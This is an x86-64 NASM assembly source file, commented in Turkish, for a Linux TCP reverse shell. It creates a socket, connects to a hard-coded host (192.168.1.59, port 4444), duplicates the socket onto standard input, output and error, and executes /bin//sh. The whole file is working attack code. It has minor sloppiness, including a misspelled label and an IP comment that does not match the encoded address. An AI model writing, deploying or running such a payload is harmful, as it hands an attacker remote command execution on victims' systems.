;nasm -f elf64 reverse_shell_tcp.asm -o reverse_shell.o
;ld reverse_shell.o -o reverse_shell

global _start

_start:
	sub rsp, 0x8000
    and rsp, -16
    mov rbp, rsp            ; çapa
    
    lea rsi, [rel struct_sockaddr]
    lea rdi, [rbp + 0x200]
	mov rcx, 16
	rep movsb
	jmp contiune
	
	
	; --- VERİ ŞABLONLARI ---
	struct_sockaddr:
    dw 2                ; sin_family: AF_INET (2)
    dw 0x5c11           ; sin_port: 4444 (Network Byte Order) python3 -c "import socket; print(hex(socket.htons(4444)))"
    db 192, 168, 1, 59     ; sin_addr: 127.0.0.1 (IP adresini direkt yazabilirsin) değiştir
    dq 0                ; sin_zero: 8 bayt boşluk (Padding)
	
	run db "/bin//sh", 0
	
contiune:
	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall
	mov r12, rax			; saving fdno
	
	
	mov rax, 42
	mov rdi, r12
	lea rsi, [rbp + 0x200]
	mov rdx, 16
	syscall
	
	mov rbx, 2
_loop:
	mov rax,33 				; dup2
	mov rdi, r12
	mov rsi, rbx
	syscall
	dec rbx
	jns _loop

	xor rdx, rdx
	mov rax,59 				; execv
	lea rdi, [rel run]
	push 0
	push rdi
	
	mov rsi, rsp
	syscall	
